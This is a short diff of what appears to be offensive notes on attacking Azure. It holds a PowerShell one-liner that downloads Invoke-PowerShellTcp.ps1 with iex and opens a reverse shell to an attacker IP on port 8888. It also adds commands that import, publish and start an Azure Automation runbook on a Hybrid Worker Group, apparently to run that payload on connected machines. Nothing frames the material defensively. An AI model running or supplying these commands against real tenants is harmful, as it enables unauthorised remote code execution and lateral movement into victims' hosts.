@@ -9,3 +9,10 @@ $creds = New-Object System.Management.Automation.PSCredential ("CLIENT_ID", $pas
 Connect-AzAccount -ServicePrincipal -Credential $creds -Tenant TENANT_ID
 ---------------------
 iex (New-ObjectNet.Webclient).downloadstring("http://10.0.10.X/Invoke-PowerShellTcp.ps1") Invoke-PowerShellTcp -Reverse -IPAddress 10.0.10.X -Port 8888
+---
+Import-AzAutomationRunbook -Name <NAME> -Path <Your PowerShell filelocation> -AutomationAccountName <The Name of the Automation Account> -ResourceGroupName<Automation Account RG> -Type PowerShell -Force -Verbose
+
+Publish-AzAutomationRunbook -RunbookName <NAME> -AutomationAccountName <The Name of the Automation Account> -ResourceGroupName <Automation Account RG> -Verbose
+
+Start-AzAutomationRunbook -RunbookName <NAME> -RunOn <Hybrid Worker Group> -AutomationAccountName <The Name of the Automation Account> -ResourceGroupName <Automation Account RG> -Verbose
+---
